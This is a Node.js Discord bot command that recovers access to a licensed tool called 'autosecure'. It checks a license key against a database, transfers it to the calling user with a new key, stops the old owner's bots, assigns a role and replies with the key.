const access = require("../../../db/access");
const { queryParams } = require("../../../db/database");
const { autosecurelogs } = require("../../../autosecure/utils/embeds/autosecurelogs");
const { transferLicense } = require("../../../autosecure/utils/bot/transferlicense");
const destroybots = require("../../../db/destroybots");
const { EmbedBuilder, AttachmentBuilder } = require('discord.js');
const { codeblock } = require("../../../autosecure/utils/process/helpers");
const config = require("../../../config.json")

module.exports = {
    name: "recover",
    description: "Recover autosecure access",
    options: [{
        name: "license_key",
        description: "Latest key you've purchased (or a new key received when recovered before)",
        type: 3,
        required: true
    }],
    callback: async (client, interaction) => {
        let token = interaction.options.getString("license_key");

        if (await access(interaction.user.id)) {
            return interaction.reply({ content: "You already have access!", ephemeral: true });
        }

        let olduser_id = await queryParams("SELECT user_id FROM usedLicenses WHERE license=?", [token]);
        if (olduser_id.length === 0) {
            return interaction.reply({
                content: "Invalid license!",
                ephemeral: true
            });
        }

        let userId = olduser_id[0].user_id;
        const result = await destroybots(userId);


        let newLicenseKey = await transferLicense(token, userId, interaction.user.id);

 
        let expiryData = await queryParams("SELECT expiry FROM usedLicenses WHERE license=?", [newLicenseKey]);
        let expiryMs = expiryData.length > 0 ? expiryData[0].expiry : null;
      //  console.log(expiryMs)
        let expiryS = Number(expiryMs)


        let expiryFormatted = "Unknown";
        if (expiryMs) {
            expiryFormatted = new Date(expiryS).toLocaleString('en-GB', {
                timeZone: 'Europe/London',
                day: '2-digit',
                month: '2-digit',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
        }

 
        const formattedDate = new Date().toLocaleString('en-GB', { 
            timeZone: 'Europe/London',
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });


        const roletoassign = config.roleid
        const guildtoassignin = config.guildid

        try {
    const guild = await client.guilds.fetch(guildtoassignin);
    const member = await guild.members.fetch(interaction.user.id);
    await member.roles.add(roletoassign);
} catch (err) {
    console.error(`Failed to assign role to ${interaction.user.id}:`, err);
}

        if (newLicenseKey) {
            await autosecurelogs(client, 'transfer', userId, interaction.user.id, token, newLicenseKey);
        } else {
            await autosecurelogs(client, 'transfer', userId, interaction.user.id, 'failed');
        }

        try {
            await destroybots(interaction.user.id);
        } catch (e) {
            console.log(`destroying bots err /recover: ${e}`);
        }


        const textContent = `New License Key: ${newLicenseKey}
Expires: ${expiryFormatted}
--------------------------
Extra Info (for admins)
User: ${interaction.user.username} (${interaction.user.id})
Date recovered: ${formattedDate} (UK)`;

        const buffer = Buffer.from(textContent, "utf-8");
        const file = new AttachmentBuilder(buffer, { name: "newlicensekeyoldwardautosecure.txt" });

        const text = codeblock(newLicenseKey);

        return interaction.reply({
            embeds: [
                new EmbedBuilder()
                    .setColor('#b2c7e0')
                    .setTitle("**Recovered your account**")
                    .setDescription("You can now do `/bots` for your bots to automatically restart and manage them again!\n\nSave your license key below, if you lose this new key, you cannot regain access.")
                    .addFields({
                        name: "New License Key (/license)",
                        value: text
                    })
            ],
            files: [file],
            ephemeral: true
        });
    }
};
